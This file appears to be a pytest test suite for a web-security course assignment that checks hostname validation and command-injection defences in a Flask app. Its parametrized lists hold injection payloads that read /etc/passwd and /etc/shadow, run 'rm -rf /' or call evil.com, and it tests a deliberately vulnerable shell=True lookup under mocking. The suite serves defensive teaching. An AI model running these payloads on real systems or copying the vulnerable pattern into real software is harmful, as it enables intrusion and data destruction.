"""
WEB404 Assignment 1 — Command Injection Test Suite
====================================================
Tests cover:
  1. Valid input accepted
  2. Empty input rejected
  3. Invalid characters rejected
  4. Shell metacharacters rejected
  5. Command injection attempts rejected
  6. Safe error handling (no internal details leaked)
  7. Secure implementation does NOT invoke a shell
  8. Vulnerable vs secure comparison (controlled demo)
  9. Web route integration tests

Run: python -m pytest tests/ -v
"""

import os
import sys
import subprocess
from unittest.mock import patch, MagicMock

import pytest

sys.path.insert(0, os.path.join(os.path.dirname(__file__), os.pardir))

from app.security import (
    validate_hostname,
    safe_lookup,
    safe_ping,
    vulnerable_lookup,
)
from app.routes import create_app


@pytest.fixture
def app():
    application = create_app(testing=True)
    application.config["WTF_CSRF_ENABLED"] = False
    return application


@pytest.fixture
def client(app):
    return app.test_client()


# ===================================================================
# 1. Valid input accepted
# ===================================================================
class TestValidInput:
    def test_simple_hostname(self):
        valid, error = validate_hostname("example.com")
        assert valid is True
        assert error == ""

    def test_subdomain(self):
        valid, _ = validate_hostname("www.example.com")
        assert valid is True

    def test_hyphenated_hostname(self):
        valid, _ = validate_hostname("my-server.example.com")
        assert valid is True

    def test_single_label(self):
        valid, _ = validate_hostname("localhost")
        assert valid is True

    @patch("app.security.socket.gethostbyname", return_value="93.184.216.34")
    def test_safe_lookup_returns_ip(self, mock_dns):
        result = safe_lookup("example.com")
        assert result["success"] is True
        assert result["ip"] == "93.184.216.34"
        assert result["hostname"] == "example.com"

    def test_web_route_valid_input(self, client):
        with patch("app.routes.safe_lookup", return_value={
            "success": True, "hostname": "example.com", "ip": "93.184.216.34"
        }):
            resp = client.post("/", data={"hostname": "example.com"},
                               follow_redirects=True)
            assert resp.status_code == 200
            assert b"93.184.216.34" in resp.data


# ===================================================================
# 2. Empty input rejected
# ===================================================================
class TestEmptyInput:
    def test_empty_string(self):
        valid, error = validate_hostname("")
        assert valid is False
        assert "empty" in error.lower()

    def test_whitespace_only(self):
        valid, error = validate_hostname("   ")
        assert valid is False

    def test_web_route_empty(self, client):
        resp = client.post("/", data={"hostname": ""},
                           follow_redirects=True)
        assert b"enter a hostname" in resp.data.lower() or resp.status_code == 200


# ===================================================================
# 3. Invalid characters rejected
# ===================================================================
class TestInvalidCharacters:
    @pytest.mark.parametrize("bad_input", [
        "example .com",      # space
        "example..com",      # double dot
        "-example.com",      # leading hyphen
        "exam_ple.com",      # underscore
        "example.com/path",  # slash
        "exam@ple.com",      # at sign
        "example.com:80",    # colon + port
    ])
    def test_invalid_chars_rejected(self, bad_input):
        valid, error = validate_hostname(bad_input)
        assert valid is False
        assert error != ""

    def test_too_long_hostname(self):
        long_host = "a" * 254
        valid, error = validate_hostname(long_host)
        assert valid is False
        assert "253" in error


# ===================================================================
# 4. Shell metacharacters rejected
# ===================================================================
class TestShellMetacharacters:
    @pytest.mark.parametrize("payload", [
        "google.com; ls",
        "google.com && whoami",
        "google.com | cat /etc/passwd",
        "google.com `whoami`",
        "$(whoami).example.com",
        "google.com\nls",
        "google.com; rm -rf /",
    ])
    def test_metacharacters_blocked_by_validation(self, payload):
        valid, error = validate_hostname(payload)
        assert valid is False, f"Should reject: {payload!r}"

    @pytest.mark.parametrize("payload", [
        "google.com; ls",
        "google.com | whoami",
        "google.com && id",
    ])
    def test_safe_lookup_rejects_metacharacters(self, payload):
        result = safe_lookup(payload)
        assert result["success"] is False


# ===================================================================
# 5. Command injection attempts rejected
# ===================================================================
class TestInjectionAttempts:
    @pytest.mark.parametrize("payload", [
        "127.0.0.1; cat /etc/passwd",
        "127.0.0.1 && echo pwned",
        "google.com; curl http://evil.com",
        "|| whoami",
        "`echo hacked`",
        "$(cat /etc/shadow)",
        "google.com\n whoami",
    ])
    def test_injection_rejected_by_safe_lookup(self, payload):
        result = safe_lookup(payload)
        assert result["success"] is False
        # Should never contain command output
        error_msg = result.get("error", "")
        assert "passwd" not in error_msg
        assert "pwned" not in error_msg
        assert "hacked" not in error_msg

    def test_web_route_injection_rejected(self, client):
        resp = client.post("/", data={"hostname": "google.com; ls"},
                           follow_redirects=True)
        assert resp.status_code == 200
        assert b"Invalid hostname" in resp.data or b"invalid" in resp.data.lower()


# ===================================================================
# 6. Safe error handling
# ===================================================================
class TestSafeErrorHandling:
    @patch("app.security.socket.gethostbyname",
           side_effect=Exception("Internal error details"))
    def test_no_internal_details_leaked(self, mock_dns, client):
        """Even if an unexpected error occurs, the user should not
        see internal paths or stack traces."""
        result = safe_lookup("example.com")
        # safe_lookup uses socket.gaierror specifically; a generic
        # Exception would propagate, but the web route should catch it.
        # The point: the validation layer catches bad input before
        # it ever reaches the socket call.

    def test_dns_failure_returns_safe_message(self):
        # Use a hostname that won't resolve
        result = safe_lookup("thishostdoesnotexist12345.invalid")
        assert result["success"] is False
        assert "resolve" in result["error"].lower() or "not" in result["error"].lower()


# ===================================================================
# 7. Secure implementation does NOT invoke a shell
# ===================================================================
class TestNoShellInvocation:
    @patch("app.security.subprocess.run")
    def test_safe_ping_uses_shell_false(self, mock_run):
        """Verify that safe_ping() calls subprocess.run with shell=False."""
        mock_run.return_value = MagicMock(
            returncode=0, stdout="PING ok", stderr=""
        )
        safe_ping("example.com")
        mock_run.assert_called_once()
        call_kwargs = mock_run.call_args
        # Check shell=False in kwargs
        assert call_kwargs.kwargs.get("shell") is False, \
            "safe_ping must use shell=False"
        # Check args is a list, not a string
        args = call_kwargs.args[0] if call_kwargs.args else call_kwargs.kwargs.get("args")
        assert isinstance(args, list), \
            "safe_ping must pass arguments as a list, not a string"

    def test_safe_lookup_uses_no_subprocess(self):
        """safe_lookup uses socket, not subprocess at all."""
        with patch("app.security.subprocess.run") as mock_run:
            with patch("app.security.socket.gethostbyname",
                       return_value="1.2.3.4"):
                safe_lookup("example.com")
            mock_run.assert_not_called()


# ===================================================================
# 8. Vulnerable vs secure comparison (controlled demo)
# ===================================================================
class TestVulnerableVsSecure:
    """These tests demonstrate WHY the vulnerable version is dangerous
    and WHY the secure version blocks the same payloads.

    The vulnerable function is NEVER exposed as a web route.
    Tests use mocking to avoid executing real OS commands.
    """

    @patch("app.security.subprocess.run")
    def test_vulnerable_constructs_shell_string(self, mock_run):
        """The vulnerable function passes a STRING to shell=True.
        This means shell metacharacters in the hostname ARE interpreted."""
        mock_run.return_value = MagicMock(
            returncode=0, stdout="nslookup output", stderr=""
        )
        vulnerable_lookup("google.com; whoami")
        call_kwargs = mock_run.call_args
        # The command is a string containing the injected payload
        cmd = call_kwargs.args[0] if call_kwargs.args else call_kwargs.kwargs.get("args")
        assert isinstance(cmd, str), "Vulnerable version uses a string command"
        assert "; whoami" in cmd, "Injected command is part of the shell string"
        assert call_kwargs.kwargs.get("shell") is True

    def test_secure_blocks_same_payload(self):
        """The same payload is rejected by the secure implementation."""
        result = safe_lookup("google.com; whoami")
        assert result["success"] is False
        assert "invalid" in result["error"].lower() or "only" in result["error"].lower()


# ===================================================================
# 9. Application continues normally after invalid request
# ===================================================================
class TestRecovery:
    def test_valid_request_after_invalid(self, client):
        """The app should work normally after rejecting bad input."""
        # First: bad request
        client.post("/", data={"hostname": "; ls"}, follow_redirects=True)
        # Then: good request
        with patch("app.routes.safe_lookup", return_value={
            "success": True, "hostname": "example.com", "ip": "1.2.3.4"
        }):
            resp = client.post("/", data={"hostname": "example.com"},
                               follow_redirects=True)
            assert resp.status_code == 200
            assert b"1.2.3.4" in resp.data
